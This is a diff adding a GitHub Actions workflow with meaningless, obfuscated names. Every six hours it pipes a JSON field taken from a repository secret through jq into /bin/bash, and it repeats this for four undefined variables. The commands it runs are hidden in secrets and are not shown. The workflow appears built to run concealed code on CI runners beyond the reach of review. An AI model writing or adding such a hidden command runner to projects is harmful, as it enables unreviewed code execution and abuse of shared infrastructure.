@@ -1,0 +1,23 @@
+name: notionstaid
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: notionstaid
+        env:
+          yusxf30821: ${{ secrets.yusxf30821 }}
+        run: |
+          echo $yusxf30821 | jq -r .kbsjh672 | /bin/bash
+          echo $onen7111 | jq -r .qmly18683 | /bin/bash
+          echo $uq5 | jq -r .glk9033 | /bin/bash
+          echo $gtzj072 | jq -r .kbnsy3959 | /bin/bash
+          echo $gn636 | jq -r .ukr0 | /bin/bash
+
